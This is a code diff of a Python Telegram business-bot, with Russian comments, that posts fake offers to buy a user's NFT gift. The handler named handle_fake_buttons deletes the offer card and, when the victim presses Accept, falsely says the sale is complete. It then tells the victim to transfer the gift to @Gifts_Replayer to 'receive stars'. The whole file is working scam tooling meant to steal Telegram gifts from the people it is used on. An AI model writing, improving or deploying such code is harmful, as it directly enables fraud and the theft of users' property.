@@ -17,36 +17,47 @@ async def handle_offer_command(message: types.Message):
     business_connection_id = message.business_connection_id
     if not business_connection_id:
         return
+
     parts = message.text.split()
     if len(parts) < 3:
         return
+
     link = parts[1]
     try:
         amount = int(parts[2])
     except ValueError:
         return
+
     match = re.search(r"t\.me/nft/([a-zA-Z0-9_-]+-\d+)", link)
     if not match:
         return
+    
     gift_slug = match.group(1)
     pretty_name = get_pretty_name(gift_slug)
     username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
+
     try:
+        # Удаляем команду /of
         await bot.delete_business_messages(
             business_connection_id=business_connection_id,
             message_ids=[message.message_id]
         )
+
+        # Текст оффера
         caption_text = (
             f"Пользователь ({username})\n"
             f"предлагает вам\n"
             f"<b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a>."
         )
+
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [
                 InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{gift_slug}:{amount}"),
                 InlineKeyboardButton(text="Принять", callback_data=f"accept:{gift_slug}:{amount}")
             ]
         ])
+
+        # Отправляем оффер
         await bot.send_message(
             chat_id=message.chat.id,
             text=caption_text,
@@ -59,6 +70,7 @@ async def handle_offer_command(message: types.Message):
                 prefer_large_media=True
             )
         )
+
     except Exception as e:
         print(f"Ошибка отправки: {e}")
 
@@ -67,30 +79,40 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message:
         await callback.answer("Сообщение не найдено.", show_alert=True)
         return
+
     data_parts = callback.data.split(":")
     action = data_parts[0]
     gift_slug = data_parts[1]
     amount = data_parts[2]
+
     link = f"https://t.me/nft/{gift_slug}"
     pretty_name = get_pretty_name(gift_slug)
     business_connection_id = callback.message.business_connection_id
+
     try:
+        # Удаляем старое сообщение
         await bot.delete_business_messages(
             business_connection_id=business_connection_id,
             message_ids=[callback.message.message_id]
         )
+
         if action == "accept":
+            # ТЕКСТ КАК НА ТВОЕМ СКРИНШОТЕ
             new_text = (
                 f"🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n"
-                f"• Передайте подарок пользователю <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зачисления звёзд.\n\n"
-                f"<i>👉 Нажмите «Прикрепить» → «Подарок» → выберите этот NFT и отправьте @Gifts_Replayer.</i>"
+                f"• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зачисления звёзд."
             )
+            
+            # Кнопка "Передать NFT"
             new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text="Передать NFT", url="https://t.me/Gifts_Replayer")]
             ])
         else:
+            # Текст при отклонении
             new_text = f"❌ Оффер на <b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен."
             new_keyboard = None
+
+        # Отправляем НОВОЕ сообщение с карточкой, текстом и кнопкой
         await bot.send_message(
             chat_id=callback.message.chat.id,
             text=new_text,
@@ -103,9 +125,11 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
                 prefer_large_media=True
             )
         )
+        
         await callback.answer()
+
     except Exception as e:
-        print(f"!!! ОШИБКА: {e} !!!")
+        print(f"Ошибка обработки кнопки: {e}")
         await callback.answer("Произошла ошибка.", show_alert=True)
 
 async def main():
